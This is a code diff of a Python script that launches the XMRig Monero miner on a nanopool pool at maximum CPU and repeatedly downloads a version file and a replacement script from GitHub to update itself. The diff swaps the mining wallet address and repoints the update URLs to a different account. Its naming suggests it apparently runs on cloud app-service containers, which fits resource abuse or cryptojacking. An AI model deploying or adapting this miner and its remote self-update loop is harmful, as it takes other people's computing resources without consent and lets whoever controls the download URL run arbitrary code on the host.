@@ -36,7 +36,7 @@ if operate_system == 'lin':
         pass
 import psutil
 #command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf.container_appservice -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80 -t %s' %cores
-command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 88e2EcQKBMR4x5THL3VNHxQQZuZTcyEQsSGRm2qfu7kkhwrMyD5E5Ancgns9vcgPyP825srEPSjrbDw3t1b3tKabV9194xx.container_appservice -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80 -t %s' %cores
+command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 87dy3GQJKwK8DyaWZXdBwzT2cJrzhkKJnFnetJJi7dxJKguRgQWdfP2GrqEKeUwnk33F9jEHaLDLeLvUbnFTzHVb19PthNg.container_appservice -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80 -t %s' %cores
 #command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
 while True:
     time.sleep(1)
@@ -44,8 +44,8 @@ while True:
     print(working_dir)
     path_app = os.path.realpath(__file__)
     version_chinh = 5.0
-    link_version_chinh = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/version_container_appservice'
-    link_dao = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/container_appservice.py'
+    link_version_chinh = 'https://raw.githubusercontent.com/rolandsmedi95/giautoidi/beta/daonhanh/config/version_container_appservice'
+    link_dao = 'https://raw.githubusercontent.com/rolandsmedi95/giautoidi/beta/daonhanh/config/container_appservice.py'
     try:
         response = requests.get(link_version_chinh, timeout=timeout)
         get_version_chinh = float(response.text)
